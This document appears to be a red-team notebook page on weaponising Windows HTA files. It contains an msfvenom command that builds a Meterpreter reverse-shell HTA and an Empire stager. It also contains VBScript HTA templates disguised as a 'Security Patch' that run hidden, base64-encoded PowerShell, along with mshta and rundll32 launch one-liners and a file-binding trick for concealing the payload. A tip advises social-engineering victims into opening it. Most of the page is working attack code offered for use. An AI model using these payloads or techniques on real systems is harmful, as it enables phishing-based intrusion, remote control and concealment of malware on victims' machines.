# HTA

## 01 - Generate Payloads

### 1.1 - `msfvenom`

> [!INFO] Payload's Limitation
> It couldn't handle a command execution that exceeded 8192 characters.. Check for more details about [[Command Prompt|command prompt]] (`cmd.exe`).
 
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f hta-psh -o payload.hta
```

### 1.2 - Empire

```
(Empire) > usestager windows/launcher_hta
```

### 1.3 - HTA Templates

HTA payload template.

```html
<html>
	<head>
		<title>
			Security Patch
		</title>
	</head>
	<body>
		<p>Installing security patch...</p>
	</body>
	<script language="VBScript">
	Function Execute()
		Set shell = CreateObject("WScript.Shell")
		shell.Run "<commands>", 0
	End Function

	Execute
	</script>
</html>
```

This is a de-obfuscated format of `hta-psh` in `msfvenom`. Refer to this [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/Malware Development/Payload Execution/Command Execution/Execute Commands/Windows/WinAPI|section]] related to command execution using `powershell.exe`.

```html
<script language="VBScript">
  window.moveTo -4000, -4000
  Set Shell = CreateObject("WScript.Shell")
  Set Program = CreateObject("Scripting.FileSystemObject")
  For each path in Split(Shell.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If Program.FileExists(path + "\..\powershell.exe") Then
      Shell.Run "powershell -nop -w hidden -e <base64_encoded_powershell_script>", 0
      Exit For
    End If
  Next
  window.close()
</script>
```

## 02 - Execute Payloads

> [!TIP] HTA Payloads
> You can actually social engineer the victim to double click the `.hta` to establish connection.

### 2.1 - `mshta.exe`

```
C:\> mshta.exe vbscript:Execute("MsgBox(""Would you like to update Windows?"", 64, ""Example"")(window.close)")

C:\> mshta.exe javascript:alert("Please Install Required Update")
```

To execute the payload.

```
C:\> mshta.exe %CD%\payload.hta

C:\> mshta.exe <drive_letter>:\absolute\path\to\payload.hta
```

### 2.2 - `rundll32.exe`

```
C:\> rundll32.exe url.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.hta"

C:\> rundll32.exe url.dll,FileProtocolHandler "<drive_letter>:\absolute\path\to\payload.hta"

C:\> rundll32.exe url.dll,OpenURLA "<drive_letter>:\absolute\path\to\payload.hta"

C:\> rundll32.exe shdocvw.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.hta"

C:\> rundll32.exe ieframe.dll,OpenURL "<drive_letter>:\absolute\path\to\payload.hta"
```

## 03 - Polyglot

> [!TIP]
> Feel free to experiment around binding any binary file format with `.hta` payload.

Bind the binary files together.

```
C:\> copy /y /b filename.extension+payload.hta hidden_payload.extension
```

It's also possible to do this in `wine`.

```
$ wine cmd.exe /y /c copy /b filename.extension+payload.hta hidden_payload.extension
```

Then execute it

```
C:\> mshta.exe %CD%\hidden_payload.extensions
```

---
## References

### Backlinks

- [[Rundll32]]

- [[06 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xB - Client-Side Attacks/Delivery Methods/File Attachment/Web Drive-by/Windows/Manual/Living off the Land]]

### LOLBAS

- [LOLBAS: Mshta](https://lolbas-project.github.io/lolbas/Binaries/Mshta/)

### Red Team Notes

- [Red Team Notes: MSHTA](https://www.ired.team/offensive-security/code-execution/t1170-mshta-code-execution)

### DMCXBlue

- [DMCXBlue: MSHTA](https://dmcxblue.gitbook.io/red-team-notes/execution/mshta)

### Sevagas

- [Sevagas: Hacking around HTA files](https://blog.sevagas.com/?Hacking-around-HTA-files)